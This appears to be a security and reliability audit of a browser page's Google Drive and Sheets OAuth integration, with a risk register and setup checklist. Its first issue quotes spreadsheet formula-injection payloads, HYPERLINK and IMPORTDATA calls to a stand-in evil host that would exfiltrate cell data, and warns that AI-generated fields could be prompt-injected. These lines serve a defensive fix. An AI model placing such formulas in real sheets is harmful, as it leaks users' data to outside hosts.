# Google Integration Expert — Round 1 Audit

## Verdict
`improve` — the Drive/Sheets wiring is structurally correct and uses the right modern primitives (GIS token client + multipart upload + Sheets v4 values API), but it has several latent bugs (header-init race, GID unused, dedup is case-only) and one real injection vector that need targeted fixes rather than a rewrite.

## Top 3 strengths
- Correct use of Google Identity Services token client with the right scopes (`drive.file` + `spreadsheets`), and the token is held in memory only — no `localStorage`/`sessionStorage` persistence (lines 187, 484–491). `drive.file` is the minimum-privilege Drive scope and is the right call here.
- Drive multipart upload is built properly with `metadata` + `file` parts, sets `parents:[DRIVE_FOLDER]` so the file lands in the target folder, and requests `fields=id,name,webViewLink` so the response is usable (lines 514–524). Errors are surfaced via `error.message` rather than swallowed.
- Sheets upsert path actually reads existing rows and does a `PUT` for updates vs `append` for inserts, so re-saving the same artwork edits its row instead of duplicating it (lines 525–555). That is the right shape for an idempotent "save all" button.

## Top 5 issues

1. **[blocker] Formula injection via title / any text field → executes when written to Drive link cell (lines 534–546, 547, 553).** All field values are passed through `valueInputOption=USER_ENTERED`, which means any leading `=`, `+`, `-`, `@` is interpreted as a formula. A title like `=HYPERLINK("https://evil.example/", "click")` or `=IMPORTDATA("https://evil/"&A2)` ends up live in the sheet. Even though Sveta is the only writer, the same risk applies to AI-generated `description`/`tags` if the model is ever prompt-injected by EXIF/visual content. **Fix:** switch to `valueInputOption=RAW`, *or* prefix any value starting with `=+-@` with a leading apostrophe before sending. RAW is simpler and correct here since none of the columns are meant to be formulas.

2. **[high] Header-init race + wrong condition (line 547).** `if(rows.length===0)` writes the `COLS` header row *only when the sheet is completely empty*, but `rows` is read from `A:B` (line 527), so an existing sheet with any header at all skips init — fine. The real problem is the opposite: if the sheet *is* empty, the code appends `COLS` and then immediately falls through to the `rowIdx>0 / else` branch and appends the data row in a separate request. Two appends race on the same `A1:append` endpoint and aren't guaranteed to land in order; worse, the header-write response isn't awaited-then-checked before computing `rowIdx`, so a partial failure leaves data without headers. **Fix:** `await` the header write, then re-issue the read, or batch both rows into a single `values:batchUpdate` call. Also: the header check should compare against `COLS` rather than just emptiness, so header drift is detected.

3. **[high] Dedup is case-insensitive but otherwise exact, and ignores whitespace/punctuation (line 531).** `rows[i][1].toLowerCase()===title.toLowerCase()` means `"Autumn Light"` and `"Autumn Light "` (trailing space) and `"Autumn  Light"` (double space) and `"autumn-light"` create duplicate rows. Empty title (`title===''`) matches any row whose Title cell is also empty/falsy via the `rows[i][1]&&` guard — so empty title goes to `else` branch and *always* appends, which is the correct behavior, but only by accident. Also: there is no lock between the read (line 527) and the write (line 550/553), so two `saveAll()` clicks in flight will both see `rowIdx=-1` and both append, producing duplicates. **Fix:** normalize with `.trim().replace(/\s+/g,' ').toLowerCase()` on both sides, disable the Save-all button for the entire `saveAll()` lifetime (it is disabled at line 496 but only via `disabled` attribute — a second click via keyboard or rapid click before the await can still slip in; use a module-level `inFlight` guard).

4. **[high] No token-expiry handling and 58-minute hard timeout instead of using the real `expires_in` (line 488).** `setTimeout(()=>{cachedToken=null;},3500000)` is a magic number (~58 min). The token client returns `expires_in` in the callback `r` — that should drive the eviction. Worse, if a request 401s mid-flight (revoked grant, clock skew, scope mismatch), there is no retry: `uploadToDrive`/`upsertSheetRow` just throw. The user sees `Error: 401` and has to click again. **Fix:** use `r.expires_in*1000 - 60000` for the timeout, and on a 401 from any Google call, clear `cachedToken` and re-prompt once.

5. **[medium] `DRIVE_FOLDER` only works if Sveta owns it and `drive.file` scope sees it; filename collisions create duplicate Drive files (lines 519–523).** `drive.file` scope only grants access to files the *app* created or that the user explicitly opened with the app picker — it does **not** automatically grant access to a pre-existing folder by ID. If Sveta created the folder manually in the Drive UI (not through this app), the upload may succeed (because creating in a parent folder is generally allowed under `drive.file`) but the app can't subsequently list/dedup files in that folder. Combined with the lack of any "does a file with this name already exist?" check, re-saving the same artwork creates a *second* file in Drive (the Sheets row gets updated to point at the new file's ID, orphaning the old one). **Fix:** before upload, `GET https://www.googleapis.com/drive/v3/files?q=name='<escaped>' and '<DRIVE_FOLDER>' in parents and trashed=false&fields=files(id,name)` — if a match exists, `PATCH /upload/drive/v3/files/{id}?uploadType=media` to overwrite. Document explicitly that the folder must have been created by this OAuth client OR add the wider `drive` scope (which is overkill).

## OAuth / Drive / Sheets risk register

| Risk | Likelihood | Impact | Mitigation |
|---|---|---|---|
| `=HYPERLINK(...)` / `=IMPORTDATA(...)` injection via title or AI-generated description | Medium (AI fields are model-controlled) | High (data exfil, sheet corruption) | Switch to `valueInputOption=RAW` or escape leading `=+-@` |
| Token expires mid-save → 401, no retry | High over a 58-min session | Medium (one extra click, partial state) | Honor `expires_in`; on 401 clear cache + re-prompt once |
| User denies OAuth consent | Medium | Medium (silent failure currently) | `requestAccessToken` callback receives `r` with no `access_token` and possibly `error`/`error_description` — surface that text, not just "Auth failed" |
| Two `saveAll` clicks race → duplicate Sheet rows | Low (UI disables button) | Medium | Add module-level `inFlight` boolean checked synchronously before `getAccessToken` |
| Sheet header drift (Sveta reorders columns manually) | Medium over time | High (data lands in wrong columns silently) | Read row 1, compare to `COLS`, refuse to write on mismatch with a clear status message |
| Drive filename collision → duplicate files, orphaned old version | High (re-saves are explicit goal) | Medium (storage waste, broken old links) | Query by name in folder, PATCH existing file instead of POST |
| Drive folder not accessible under `drive.file` scope | Medium (depends on how folder was created) | Blocker (uploads succeed but ownership/listing is murky) | Document folder-creation requirement; have the page itself create the folder on first run if missing |
| GSI script load race — `saveAll` clicked before `accounts.google.com/gsi/client` finishes loading | Low (async script + user has to upload+process first) | Low (returns `null`, shows "Auth failed") | Already handled at line 487, but message is misleading — say "Google sign-in not ready, try again" |
| `CLIENT_ID` in source is fine (public by design), but mis-scoped client (e.g. "Web application" without correct origin) silently 403s | Medium on first setup | Blocker until fixed | See setup checklist below |
| Console-logged tokens (none currently, but easy to add during debugging) | Low | Medium (bearer token exposure) | Add an explicit rule never to `console.log(cachedToken)`; the current code does not log it |
| CORS — none of the Google endpoints used (`upload/drive/v3`, `sheets.googleapis.com`, `accounts.google.com/gsi/client`) require any CORS workaround; they all return appropriate `Access-Control-Allow-Origin` for the origin once it's in the OAuth client's "Authorized JavaScript origins" | n/a | n/a | Just ensure origin is registered (see below) |
| `file://` origin — GIS does **not** support `file://` origins; the page must be served from `http://localhost:<port>` | Certain if Sveta opens the file directly | Blocker | Document `python3 -m http.server` or similar; register `http://localhost:8000` (or whatever port) as authorized origin |

## Required Cloud Console setup

Sveta must complete all of these before the page can authenticate at all. None of this is in the file or in any README.

- [ ] **Google Cloud project exists** and is selected — the `CLIENT_ID` `754552250731-...` already exists in *some* project; confirm which one she controls.
- [ ] **APIs enabled** in that project:
  - [ ] Google Drive API
  - [ ] Google Sheets API
  - [ ] (Google Identity Services / OAuth itself does not need enabling)
- [ ] **OAuth consent screen configured:**
  - [ ] User type: **External** (unless she has Workspace; then Internal is fine)
  - [ ] Publishing status: **Testing** is acceptable for personal use
  - [ ] Add her own Gmail/Workspace address under **Test users** (required in Testing mode; otherwise OAuth blocks with `access_denied`)
  - [ ] App name, support email, developer contact filled in
  - [ ] Scopes added on the consent screen: `https://www.googleapis.com/auth/drive.file` and `https://www.googleapis.com/auth/spreadsheets`. Note: `drive.file` is non-sensitive; `spreadsheets` is **sensitive** and triggers Google's verification warning in External/Testing mode — fine while she's a test user, would need verification if ever published.
- [ ] **OAuth 2.0 Client ID** (Credentials → Create credentials → OAuth client ID):
  - [ ] Application type: **Web application** (not Desktop, not Other)
  - [ ] **Authorized JavaScript origins** — *exact* origin where the page is served, no path, no trailing slash:
    - [ ] `http://localhost:8000` (or whichever port she actually uses)
    - [ ] Add `http://127.0.0.1:8000` as well — browsers treat these as distinct origins
    - [ ] **Do not add `file://`** — GIS will reject it. The page must be served, not double-clicked.
  - [ ] **Authorized redirect URIs** — *not needed* for the token client / implicit flow used here (GIS handles it via postMessage); leave empty.
- [ ] **Drive folder ownership/visibility:**
  - [ ] Folder `1M8wTOfPAYeJZZL6d7RYo2DLtIapuxDOX` must be in the same Google account that grants consent (or shared to her with edit access).
  - [ ] Because the app uses `drive.file` scope, uploads into that folder will work, but the app cannot list its other contents. If she wants the page to dedup-by-name later, either (a) widen scope to `drive` or `drive.readonly` (overkill, triggers verification), or (b) have the page create its own folder on first run and store the ID.
- [ ] **Sheet permissions:**
  - [ ] Sheet `170BuYN45Wk7H2g31gfRo35quok76JwrhFB8YV4-ckfI` must be editable by the consenting account.
  - [ ] Tab `Sheet1` must exist (the code does not create tabs).
  - [ ] The `SHEET_GID='1031748871'` constant (line 179) is declared but **never used** — confirm whether `Sheet1` and gid `1031748871` are the same tab; if not, the code is hitting the wrong tab.
- [ ] **Local serving:**
  - [ ] Run `python3 -m http.server 8000` from the repo root (or any equivalent) and open `http://localhost:8000/tools/photo_manager.html`.
  - [ ] Hard-refresh after changing OAuth client settings — GIS caches the discovery doc aggressively.

## Out-of-scope concerns

- **AI integration is broken as shipped** (line 335, browser → `api.anthropic.com` directly with no `x-api-key` and no `anthropic-version` header, and Anthropic's API does not allow `Access-Control-Allow-Origin: *` for browser calls regardless). Flagged in the spec — AI integration manager's lane.
- **Tabler icons CDN dependency** (line 174) — works offline only after first cache. Frontend lane.
- **`accept="image/*"`** (line 75) lets the browser pick HEIC on Mac, which canvas may not decode — needs HEIC → JPEG conversion (the Python pipeline already does this with `pillow-heif`). QA / image-processing lane.
- **WebGL perspective warp** has no fallback for browsers without WebGL (line 442 returns `null` silently). Image-processing lane.
- **No accessibility on canvas overlays** — drag handles are mouse-only, no keyboard equivalent (lines 421–423, 466–468). Frontend lane.
- **`new Date().toISOString().slice(0,10)`** gives UTC date (line 535) — for a Canadian artist, this can be the wrong calendar day for several hours each evening. Frontend / UX lane.
- **Watermark is destructive and applied on every `applyAll()` redraw** (line 261, 264–269) — the canvas the user sees is what gets uploaded, so the watermark is baked in. That's probably intentional but worth confirming with Sveta. Image-processing lane.
